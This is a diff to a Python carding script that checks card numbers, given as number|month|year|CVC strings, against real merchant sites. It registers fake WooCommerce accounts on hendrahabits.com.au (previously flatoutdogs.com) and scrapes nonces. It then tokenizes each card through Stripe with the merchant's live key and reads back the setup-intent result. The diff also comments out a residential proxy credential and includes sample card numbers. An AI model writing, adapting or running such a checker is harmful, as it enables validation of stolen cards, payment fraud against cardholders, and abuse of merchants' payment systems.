@@ -2,7 +2,7 @@ import random
 import string
 import requests
 from user_agent import generate_user_agent
-from proxy import reqproxy, make_request
+#from proxy import reqproxy, make_request
 import json
 import re
 
@@ -34,18 +34,22 @@ def generate_random_code(length=32):
 
 #============================================
 def Tele(ccx):
-    proxy_str = "proxy.insideproxy.net:3389:res-any:pgw-df6b371b8ec65c798929f20b1b3257302159d84a48d2a1d5"
-    session, ip = reqproxy(proxy_str)
+    #proxy_str = "proxy.insideproxy.net:3389:res-any:pgw-df6b371b8ec65c798929f20b1b3257302159d84a48d2a1d5"
+    #session, ip = reqproxy(proxy_str)
     #print(f"IP Address: {ip}")
+    session = requests.Session()
     ccx=ccx.strip()
-    n = ccx.split("|")[0]
-    mm = ccx.split("|")[1]
-    yy = ccx.split("|")[2]
-    cvc = ccx.split("|")[3]
-    if "20" in yy:#Mo3gza
-        yy = yy.split("20")[1]
-    #if "01" in mm or "02" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
-        #mm = mm.split("0")[1]
+    numbers = re.findall(r"\d+", ccx)
+    n = mm = yy = cvc = ""
+    if len(numbers) >= 4:
+        n = numbers[0]
+        mm = numbers[1]
+        yy = numbers[2]
+        cvc = numbers[3]
+        mm = str(int(mm))
+        if len(yy) == 4:
+            yy = yy[-2:]
+
 
     user = generate_user_agent()
     r = requests.Session()
@@ -59,33 +63,82 @@ def Tele(ccx):
     corr = generate_random_code()
     sess = generate_random_code()
     nr = random.randint(100000, 999999)
-    lr = random.randint(50, 99)
+    lr = random.randint(1000, 9999)
 
-    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F5568634f16%3B+stripe-js-v3%2F5568634f16%3B+card-element&referrer=https%3A%2F%2Fwww.flatoutdogs.com&time_on_page=73352&key=pk_live_51KVQQVJDFNYj93BWIN0m53QB7Z0M05NXatithUZPgxv4ZVblQVJI0ctbwKHBvfwNmGOQPoKvF4Jx402oV7g3YxIX00TLe7hzCL'
+    headers = {
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+    }
     
-    response = requests.post('https://api.stripe.com/v1/payment_methods', data=data)
+    response = session.get('https://hendrahabits.com.au/my-account/add-payment-method/', headers=headers)
     
-    pm = response.json()['id']
+    register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
+    print(register)
     
     headers = {
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'referer': 'https://www.flatoutdogs.com/kickoff-registration/',
-        'user-agent': user,
+        'content-type': 'application/x-www-form-urlencoded',
+        'referer': 'https://hendrahabits.com.au/my-account/add-payment-method/',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
     }
     
     data = {
-        'data': f'__fluent_form_embded_post_id=4218&_fluentform_19_fluentformnonce=6d1382ae57&_wp_http_referer=%2Fkickoff-registration%2F&names%5Bfirst_name%5D={first_name}&names%5Blast_name%5D={last_name}&email=rodamuser{nr}%40gmail.com&input_text=27%20Allen%20St&input_text_2=&input_text_3=New%20York&country-list=US&dropdown_1=New%20York&input_text_1=10002&payment_input_1%5B%5D=&description=&payment-coupon=&custom-payment-amount=0&custom-payment-amount_1=0.{lr}&payment_method=stripe&__ff_all_applied_coupons=&payment_input%5B%5D=&__stripe_payment_method_id={pm}',
-        'action': 'fluentform_submit',
-        'form_id': '19',
+        'email': f'rodamuser{nr}@gmail.com',
+        'wc_order_attribution_source_type': 'typein',
+        'wc_order_attribution_referrer': 'https://hendrahabits.com.au/my-account/add-payment-method/',
+        'wc_order_attribution_utm_campaign': '(none)',
+        'wc_order_attribution_utm_source': '(direct)',
+        'wc_order_attribution_utm_medium': '(none)',
+        'wc_order_attribution_utm_content': '(none)',
+        'wc_order_attribution_utm_id': '(none)',
+        'wc_order_attribution_utm_term': '(none)',
+        'wc_order_attribution_utm_source_platform': '(none)',
+        'wc_order_attribution_utm_creative_format': '(none)',
+        'wc_order_attribution_utm_marketing_tactic': '(none)',
+        'wc_order_attribution_session_entry': 'https://hendrahabits.com.au/my-account/add-payment-method/',
+        'wc_order_attribution_session_start_time': '2026-05-09 16:34:24',
+        'wc_order_attribution_session_pages': '1',
+        'wc_order_attribution_session_count': '1',
+        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        'woocommerce-register-nonce': f'{register}',
+        '_wp_http_referer': '/my-account/add-payment-method/',
+        'register': 'Register',
     }
     
-    response = session.post(
-        'https://www.flatoutdogs.com/wp-admin/admin-ajax.php',
-        headers=headers,
-        data=data,
-    )
-
-    return response.text
+    response = session.post('https://hendrahabits.com.au/my-account/add-payment-method/', headers=headers, data=data)
     
-#test_card = "5488093801213161|10|28|945"
+    ajax = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response.text).group(1)
+    print(ajax)
+    
+    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=AU&payment_user_agent=stripe.js%2Fc891fde8fc%3B+stripe-js-v3%2Fc891fde8fc%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhendrahabits.com.au&time_on_page=105109&guid=NA&muid=NA&sid=NA&key=pk_live_51Lv72tBTsguVbm1C8raLSY7GRZM7Ag7jHFBLzEBOtYP3lg53GRev8R3CZjJmv4la6iKCOn1UbOPgDvTbnb7GOaBB00QzUJtLnx'
+    
+    response = session.post('https://api.stripe.com/v1/payment_methods', data=data)
+    
+    pm = response.json()['id']
+    print(pm)
+    
+    headers = {
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'referer': 'https://hendrahabits.com.au/my-account/add-payment-method/',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+    }
+    
+    data = {
+        'action': 'wc_stripe_create_and_confirm_setup_intent',
+        'wc-stripe-payment-method': f'{pm}',
+        'wc-stripe-payment-type': 'card',
+        '_ajax_nonce': f'{ajax}',
+    }
+    
+    response = session.post('https://hendrahabits.com.au/wp-admin/admin-ajax.php',
+    headers=headers,
+    data=data,
+)
+
+    try:
+        result = re.search(r'"message":"(.*?)"', response.text).group(1)
+    except:
+        result = re.search(r'"status":"(.*?)"', response.text).group(1)
+
+    return result
+    
+#test_card = "5196032164892776|01|28|618"
 #print(Tele(test_card))
